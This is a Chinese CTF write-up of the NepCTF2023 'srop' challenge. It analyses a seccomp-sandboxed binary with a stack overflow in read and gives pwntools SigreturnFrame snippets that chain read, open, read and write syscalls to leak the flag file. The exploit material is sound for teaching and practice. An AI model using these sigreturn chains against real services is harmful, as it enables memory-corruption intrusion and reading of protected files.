# srop(NepCTF2023)

## ORW

题目附件中提供了源码，分析并查询可知，该题目通过seccomp设置了沙箱，限制了只能使用open、write、read、rt_sigreturn这几个系统调用。

[PWN-ORW总结](https://x1ng.top/2021/10/28/pwn-orw%E6%80%BB%E7%BB%93/)

## SROP

[SROP](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/)

## 分析过程

### 1. syscall

[syscall table](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md)

main 函数一共4行

```c
char bd[0x30];
seccomp();
// write(1, buf, 0x30)
syscall(1,1,buf,0x30);
// read(0, bd, 0x300)
return syscall(0,0,bd,0x300);
```

先通过seccomp限制系统调用，然后两句syscall。分别先通过write输出buf的内容“welcome to NepCTF2023!”，随后用read向bd数组读入0x300长度的字符。

很明显这里的read有栈溢出。

找到syscall的地址0x4005B0
![syscall_addr](image.png)

这里就可以使用到pwntools自带的工具SigreturnFrame.
[pwntools srop](https://docs.pwntools.com/en/stable/rop/srop.html)

使用到的syscall

| syscall | num |
| ------- | --- |
| read    | 0   |
| write   | 1   |
| open    | 2   |

需要知道的句柄

| handle | num |
| ------ | --- |
| stdin  | 0   |
| stdout | 1   |
| stderr | 2   |

首先构造read，向bss段写入0x500大小的内容

```python
pop_rdi = 0x0000000000400813
syscall = 0x4005B0
bss_addr = elf.bss(0x500)
read_function = SigreturnFrame()
read_function.rdi = 0  # syscall read
read_function.rsi = 0  # read handle
read_function.rdx = bss_addr-0x8  # read buf
read_function.rcx = 0x500  # read count
read_function.rip = syscall
read_function.rsp = bss_addr
```

然后构造open，用open打开flag文件

```python
open = SigreturnFrame()
open.rdi = 2 # syscall open
open.rsi = bss_addr-0x8  # open path
open.rdx = 0  # open flag
open.rcx = 0
open.rip = syscall
open.rsp = bss_addr + 0x110
```

打开文件后，再使用read将flag文件读入内存

```python
read_function = SigreturnFrame()
read_function.rdi = 0 # syscall read
read_function.rsi = 3 # read handle
read_function.rdx = bss_addr - 0x200 # read buf
read_function.rcx = 0x100 # read count
read_function.rip = syscall
read_function.rsp = bss_addr + 0x220
```

最后使用write将内存中的flag打印到标准输出

```python
write_funtion = SigreturnFrame()
write_funtion.rdi = 1 # syscall write
write_funtion.rsi = 1 # write handle(stdout)
write_funtion.rdx = bss_addr - 0x200 # write path
write_funtion.rcx = 0x100 # write count
write_funtion.rip = syscall
write_funtion.rsp = bss_addr+0x30
```

这里关于flag文件的句柄，可以通过以下C代码尝试，发现在0，1，2三个标准输入输出后，打开的flag文件句柄为3

```c
int main()
{
    char buffer[1024] = {0};
    size_t bytesRead;

    int fd = syscall(2, "flag", 0);
    bytesRead = syscall(0, 3, buffer, 1023);

    syscall(1, 1, buffer, bytesRead);
}
```

运行结果：
![result](image-1.png)
